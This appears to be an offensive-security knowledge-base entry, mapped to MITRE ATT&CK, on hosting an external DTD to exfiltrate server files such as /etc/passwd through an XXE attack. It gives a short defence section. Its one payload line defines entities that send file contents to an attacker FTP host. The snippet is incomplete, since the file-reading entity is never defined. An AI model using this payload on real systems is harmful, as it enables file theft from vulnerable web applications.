---
tags:
  - xxe
  - exfiltration
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/host-dtd-file]]'
platforms:
  - Web
  - Linux
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 8063b867-fc3f-4632-996e-a5f3a705b10e
created_at: '2025-12-13T09:00:27.904Z'
updated_at: '2025-12-13T09:00:27.904Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Host External DTD for Exfiltration

## Summary

This procedure involves hosting an external DTD file on an attacker-controlled server to facilitate out-of-band exfiltration of data during an XXE attack, specifically defining entities that embed file contents into external requests.

## Description

In XXE attacks, external DTDs can be used to define entities that cause the vulnerable parser to include sensitive data in outbound requests, such as FTP URLs. This targets web applications with insecure XML parsing, enabling arbitrary file reads on Linux-based servers.

## Requirements

1. Attacker-controlled web server for hosting the DTD
2. Network accessibility from the target server to the attacker's server
3. Knowledge of the target file path (e.g., /etc/passwd)

## Defense

Defensive measures and detection strategies:

- Disable external entity processing in XML parsers
- Monitor outbound traffic for unexpected FTP or HTTP requests to unknown hosts

## Objectives

1. Prepare infrastructure for XXE exfiltration
2. Define entities to embed file contents in URLs
3. Enable capture of sensitive data out-of-band

## Instructions

### Step 1: Create and Host DTD File

**Context**: Create a file named xx.html with the malicious DTD content.

**Command** ([[commands/host-dtd-file]]):

```html
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://mysite/%b;'>">%c;
```

> This entity definition allows the exfiltration of %b (file content) via an FTP URL.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/host-dtd-file]]

## Tools Used



## Tags

- [[xxe]]
- [[Exfiltration]]
